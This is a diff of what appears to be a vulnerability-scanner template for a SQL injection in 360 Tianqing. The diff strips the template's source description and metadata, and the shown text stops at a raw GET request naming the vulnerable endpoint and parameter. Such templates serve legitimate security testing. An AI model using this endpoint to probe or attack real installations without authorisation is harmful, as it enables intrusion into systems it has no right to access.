@@ -3,12 +3,8 @@ info:
   name: 360天擎sql注入
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ar006fw7qc4368y6'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ar006fw7qc4368y6
-    fofa: 暂无
 http:
 - raw:
   - 'GET /api/dp/rptsvcsyncpoint?ccid=1 HTTP/1.1
